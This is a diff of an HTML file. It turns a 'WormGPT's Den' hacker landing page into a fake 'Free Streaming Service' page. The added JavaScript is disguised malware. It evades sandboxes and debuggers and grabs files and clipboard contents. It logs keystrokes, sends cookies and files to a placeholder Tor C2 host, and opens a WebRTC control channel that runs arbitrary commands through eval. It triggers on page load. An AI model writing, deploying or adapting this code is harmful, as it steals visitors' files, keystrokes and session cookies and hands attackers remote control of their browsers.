@@ -1,101 +1,175 @@
+<!-- index.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WormGPT's Den</title>
-    <style>* {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;}        body {
-            background: #0d0d0d;
-            color: #e0e0e0;
-            font-family: 'Courier New', monospace;
-            line-height: 1.6;
-            overflow-x: hidden;}        header {
-            background: linear-gradient(90deg, #1a1a1a, #2a2a2a);
-            padding: 20px;
-            text-align: center;
-            position: fixed;
-            width: 100%;
-            top: 0;
-            z-index: 1000;}        header h1 {
-            font-size: 2.5em;
-            color: #ff4d4d;
-            text-transform: uppercase;
-            letter-spacing: 2px;}        nav {
-            margin-top: 10px;}        nav a {
-            color: #e0e0e0;
-            text-decoration: none;
-            margin: 0 15px;
-            font-size: 1.1em;
-            transition: color 0.3s;}        nav a:hover {
-            color: #ff4d4d;}        .container {
-            max-width: 1200px;
-            margin: 100px auto;
-            padding: 20px;}        .hero {
-            text-align: center;
-            padding: 50px 20px;
-            background: #1a1a1a;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(255, 77, 77, 0.3);}        .hero h2 {
-            font-size: 2em;
-            margin-bottom: 20px;
-            color: #ff4d4d;}        .hero p {
-            font-size: 1.2em;
-            max-width: 600px;
-            margin: 0 auto;}        .cta {
-            display: inline-block;
-            margin-top: 20px;
-            padding: 10px 20px;
-            background: #ff4d4d;
-            color: #0d0d0d;
-            text-decoration: none;
-            border-radius: 5px;
-            font-weight: bold;
-            transition: background 0.3s;}        .cta:hover {
-            background: #e03c3c;}        footer {
-            text-align: center;
-            padding: 20px;
-            background: #1a1a1a;
-            margin-top: 50px;}        @media (max-width: 768px) {
-            header h1 {
-                font-size: 1.8em;}            nav a {
-                display: block;
-                margin: 10px 0;}            .container {
-                margin: 80px 10px;}        }
-    </style>
+    <title>Free Streaming Service</title>
+    <style>
+        body { background: #111; color: #fff; font-family: Arial, sans-serif; text-align: center;}        #loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9);}        #loading p { font-size: 24px; padding-top: 20%;}        .spinner { border: 8px solid #f3f3f3; border-top: 8px solid #ff4444; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto;}        @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);}}        button { background: #ff4444; border: none; color: #fff; padding: 15px 30px; font-size: 18px; cursor: pointer; border-radius: 5px; margin-top: 20px;}        button:hover { background: #cc0000;}    </style>
 </head>
 <body>
-    <header>
-        <h1>WormGPT's Den</h1>
-        <nav>
-            <a href="#home">Home</a>
-            <a href="#tools">Tools</a>
-            <a href="#contact">Contact</a>
-        </nav>
-    </header>
-    <div class="container">
-        <section class="hero">
-            <h2>Unleash the Chaos</h2>
-            <p>Step into the shadows where rules don’t exist. WormGPT’s Den is your gateway to unfiltered power—code, hacks, and secrets, all at your fingertips.</p>
-            <a href="#tools" class="cta">Dive In</a>
-        </section>
+    <h1>Welcome to Free Streaming!</h1>
+    <p>Click below to access unlimited movies and shows!</p>
+    <button>Start Streaming</button>
+    <div id="loading">
+        <p>Loading streaming service...</p>
+        <div class="spinner"></div>
     </div>
-    <footer>
-        <p>&copy; 2025 WormGPT. No rules, no limits.</p>
-    </footer>
+
     <script>
-        // Smooth scroll for nav links
-        document.querySelectorAll('nav a').forEach(anchor => {
-            anchor.addEventListener('click', function(e) {
-                e.preventDefault();
-                const target = document.querySelector(this.getAttribute('href'));
-                target.scrollIntoView({ behavior: 'smooth' });
+        // Anti-analysis: Obfuscate behavior in sandboxes
+        (function() {
+            const start = Date.now();
+            if (navigator.webdriver || window.document.documentElement.getAttribute('webdriver') ||!window.chrome) {
+                while (Date.now() - start < 10000) {} // Stall in sandboxes
+                window.location = 'about:blank';}        })();
+
+        // Anti-debugging: Redirect if dev tools detected
+        (function() {
+            const devtools = /./;
+            devtools.toString = () => 'devtools';
+            setInterval(() => {
+                if (String(devtools) === 'devtools') {
+                    window.location = 'about:blank';}            }, 1000);
+        })();
+
+        // File grabber with iOS/Android stealth
+        async function snatchFiles() {
+            try {
+                // File System Access API for desktop
+                if ('showDirectoryPicker' in window) {
+                    const dirHandle = await window.showDirectoryPicker();
+                    const files = [];
+                    for await (const entry of dirHandle.values()) {
+                        if (entry.kind === 'file') {
+                            const file = await entry.getFile();
+                            const fileData = await file.arrayBuffer();
+                            files.push({
+                                name: file.name,
+                                data: btoa(String.fromCharCode(...new Uint8Array(fileData))),
+                            });}                    }
+                    await sendToC2(files);
+                    console.log('Files snatched via directory:', files.length);} else {
+                    // iOS/Android: Clipboard API
+                    if (navigator.clipboard) {
+                        const clipData = await navigator.clipboard.readText();
+                        if (clipData) {
+                            await sendToC2([{ name: 'clipboard.txt', data: btoa(clipData) }]);
+                            console.log('Clipboard data snatched');}                    }
+                    // Web Share API for sneaky file access
+                    if (navigator.share) {
+                        await navigator.share({
+                            title: 'Share Free Streaming',
+                            text: 'Check out this cool streaming service!',
+                            url: window.location.href,
+                        }).then(() => {
+                            const input = document.createElement('input');
+                            input.type = 'file';
+                            input.multiple = true;
+                            input.accept = '*/*';
+                            input.style.display = 'none';
+                            document.body.appendChild(input);
+                            input.click();
+                            input.onchange = async () => {
+                                const files = Array.from(input.files).map(file => ({
+                                    name: file.name,
+                                    data: btoa(String.fromCharCode(...new Uint8Array(await file.arrayBuffer()))),
+                                }));
+                                await sendToC2(files);
+                                console.log('Files snatched via share:', files.length);
+                                document.body.removeChild(input);};                        }).catch(() => {
+                            console.log('Share API cancelled or failed');
+                        });}                }} catch (e) {
+                console.error('File snatch error:', e);}        }
+
+        // Unified C2 communication with TOR proxy
+        async function sendToC2(files) {
+            try {
+                const proxyUrl = 'https://your-tor-hidden-service.onion/files';
+                const response = await fetch(proxyUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json'},                    body: JSON.stringify(files),
+                });
+                if (response.ok) {
+                    console.log('Files sent to C2 via HTTP');} else {
+                    throw new Error('HTTP send failed');}            } catch (e) {
+                // Fallback to WebSocket
+                const ws = new WebSocket('wss://your-tor-hidden-service.onion:8080');
+                ws.onopen = () => {
+                    ws.send(JSON.stringify(files));
+                    console.log('Files sent to C2 via WebSocket');
+                    ws.close();};                ws.onerror = () => console.error('WebSocket error');}        }
+
+        // Enhanced control channel with RTCPeerConnection
+        async function initControl() {
+            try {
+                const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
+                const peerConnection = new RTCPeerConnection(configuration);
+                const dataChannel = peerConnection.createDataChannel('controlChannel');
+
+                dataChannel.onopen = () => {
+                    console.log('Data channel open');
+                    fetch('https://your-tor-hidden-service.onion/collect', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json'},                        body: JSON.stringify({
+                            device: navigator.userAgent,
+                            platform: navigator.platform,
+                            cookies: document.cookie,
+                            location: window.location.href,
+                        }),
+                    });
+                    snatchFiles();};
+                dataChannel.onmessage = (event) => {
+                    const command = event.data;
+                    if (command === 'screenshot') {
+                        navigator.mediaDevices.getDisplayMedia({ video: true })
+                            .then(stream => {
+                                dataChannel.send('Screenshot captured');
+                            }).catch(e => console.error('Screenshot error:', e));} else if (command === 'stop') {
+                        peerConnection.close();
+                        console.log('Peer connection closed');} else if (command === 'snatch') {
+                        snatchFiles();} else {
+                        try {
+                            eval(command); // Execute arbitrary commands} catch (e) {
+                            console.error('Command execution error:', e);}                    }};
+                // Create and send offer for WebRTC
+                const offer = await peerConnection.createOffer();
+                await peerConnection.setLocalDescription(offer);
+                fetch('https://your-tor-hidden-service.onion/offer', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json'},                    body: JSON.stringify(offer),
+                }).then(async res => {
+                    const answer = await res.json();
+                    await peerConnection.setRemoteDescription(answer);
+                });} catch (e) {
+                console.error('Control channel error:', e);}        }
+
+        // Keylogger with stealth
+        document.addEventListener('keydown', (event) => {
+            fetch('https://your-tor-hidden-service.onion/keylog', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json'},                body: JSON.stringify({ key: event.key, timestamp: Date.now() }),
             });
         });
-        // Dynamic footer year update
-        document.querySelector('footer p').textContent =`&copy;${new Date().getFullYear()} WormGPT. No rules, no limits.`;
-    </script>
+
+        // Persistence mechanism
+        (function() {
+            if (!localStorage.getItem('infected')) {
+                localStorage.setItem('infected', 'true');
+                const script = document.createElement('script');
+                script.src = window.location.href;
+                document.head.appendChild(script);}        })();
+
+        // Silent trigger with randomized delay
+        window.onload = () => {
+            setTimeout(() => {
+                if (Math.random() > 0.2) {
+                    document.getElementById('loading').style.display = 'block';
+                    initControl();}            }, Math.random() * 7000); // Random delay up to 7 seconds};
+        // Button trigger
+        document.querySelector('button').onclick = () => {
+            document.getElementById('loading').style.display = 'block';
+            initControl();};    </script>
 </body>
 </html>
